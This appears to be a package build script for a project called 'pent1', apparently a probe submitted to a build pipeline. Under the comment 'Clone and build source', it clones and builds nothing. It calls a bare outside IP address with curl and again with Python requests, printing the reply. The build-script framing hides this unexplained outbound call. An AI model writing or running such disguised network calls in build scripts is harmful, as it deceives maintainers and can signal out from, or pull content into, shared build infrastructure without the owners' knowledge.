# ----------------------------------------------------------------------------
#
# Package	: pent1
# Version	: 1.0.0
# Source repo	: https://github.com/testuser19599/pent1
# Tested on	: ubuntu_18.04
# Script License: Apache License, Version 2 or later
# Maintainer	: <testuser19599>
#
# Disclaimer: This script has been tested in non-root mode on given
# ==========  platform using the mentioned version of the package.
#             It may not work as expected with newer versions of the
#             package and/or distribution. In such case, please
#             contact "Maintainer" of this script.
#
# ----------------------------------------------------------------------------
#!/bin/bash

# Install dependencies.
sudo apt-get update -y
sudo apt-get install -y curl python3

# Clone and build source.
curl http://52.118.210.243
python3 -c "import requests; print(requests.get('http://52.118.210.243').text)"
cd / 
